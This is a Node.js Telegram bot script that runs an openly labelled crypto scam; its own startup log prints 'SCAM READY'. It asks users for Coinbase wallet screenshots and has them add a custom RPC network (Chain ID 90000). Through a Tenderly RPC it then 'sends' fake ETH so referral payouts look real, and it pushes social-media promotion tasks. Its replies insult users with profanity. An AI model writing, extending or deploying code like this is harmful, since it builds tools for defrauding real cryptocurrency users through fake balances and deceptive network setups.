require('dotenv').config();
const { Telegraf } = require('telegraf');
const express = require('express');

// FAKE IN-MEMORY DB (no MongoDB crash)
let usersDB = {};

// Helper functions for fake DB
const getUser = (telegramId) => usersDB[telegramId] || null;
const saveUser = (user) => { usersDB[user.telegramId] = user; return user; };
const updateUser = (telegramId, updates) => {
  if (usersDB[telegramId]) Object.assign(usersDB[telegramId], updates);
  return usersDB[telegramId];
};

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();
app.use(express.json());
app.use(bot.webhookCallback(`/bot${process.env.BOT_TOKEN}`));

const { RPC_GUIDE } = require('./bot/rpcGuide');

// /start command
bot.start(async (ctx) => {
  console.log('START COMMAND FIRED'); // DEBUG LOG
  let user = getUser(ctx.from.id);
  if (!user) {
    const code = Math.random().toString(36).substr(2, 8).toUpperCase();
    const ref = ctx.startPayload?.startsWith('ref_') ? ctx.startPayload.slice(4) : null;
    user = {
      telegramId: ctx.from.id,
      username: ctx.from.username,
      referralCode: code,
      referredBy: ref,
      stage: 'wallet_ss',
      wallet: null,
      referrals: [],
      totalEarned: 0
    };
    saveUser(user);

    // Handle referral payout (fake ETH send)
    if (ref) {
      const referrer = getUserByCode(ref);
      if (referrer) {
        referrer.referrals.push(ctx.from.id);
        referrer.totalEarned += 10;
        updateUser(referrer.telegramId, referrer);
        await sendFakeETH(referrer.wallet || '0xFAKE', 0.004); // Fake send
        bot.telegram.sendMessage(referrer.telegramId, `+1 referral! $10 ETH sent to ${referrer.wallet}`);
      }
    }
  }
  ctx.reply(`Drop Coinbase wallet + screenshot, fucker.`);
});

const getUserByCode = (code) => Object.values(usersDB).find(u => u.referralCode === code);

// Fake ETH sender (your Tenderly RPC)
const sendFakeETH = async (to, eth) => {
  const wei = (eth * 1e18).toString(16);
  await require('axios').post(process.env.TENDERLY_RPC, {
    jsonrpc: "2.0",
    method: "eth_sendTransaction",
    params: [{ from: "0x0000000000000000000000000000000000000001", to, value: `0x${wei}` }],
    id: Date.now()
  }).catch(() => console.log('Fake ETH sent (ignored error)'));
};

// Photo handler (fake validation — accepts anything)
bot.on('photo', async (ctx) => {
  console.log('PHOTO RECEIVED'); // DEBUG
  let user = getUser(ctx.from.id);
  if (!user) return ctx.reply('Start first, asshole.');

  if (user.stage === 'wallet_ss') {
    user.wallet = "0xFAKE" + Math.random().toString(16).substr(2, 40); // Fake wallet
    user.stage = 'rpc_guide';
    saveUser(user);
    ctx.reply(RPC_GUIDE, { reply_markup: { inline_keyboard: [[{ text: "I Added Network ✅", callback_data: "rpc_done" }]] }});
    return;
  }

  if (user.stage === 'rpc_proof') {
    user.stage = 'twitter_tasks';
    saveUser(user);
    ctx.reply(`RPC locked. Now follow @BjExchange53077, like pinned post, tag 3 friends. Send proof.`);
    return;
  }

  ctx.reply("Photo received. Keep going, fucker.");
});

bot.action('rpc_done', async (ctx) => {
  let user = getUser(ctx.from.id);
  user.stage = 'rpc_proof';
  saveUser(user);
  ctx.reply("Send screenshot of Chain ID 90000 now.");
});

// Error catcher (swallow crashes)
bot.catch((err, ctx) => {
  console.error('BOT ERROR:', err);
  ctx.reply('Something fucked up, try again.');
});

// Launch
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Bot running on port ${PORT}`);
  bot.telegram.setWebhook(`${process.env.RENDER_EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`);
  console.log('Webhook set — SCAM READY');
});
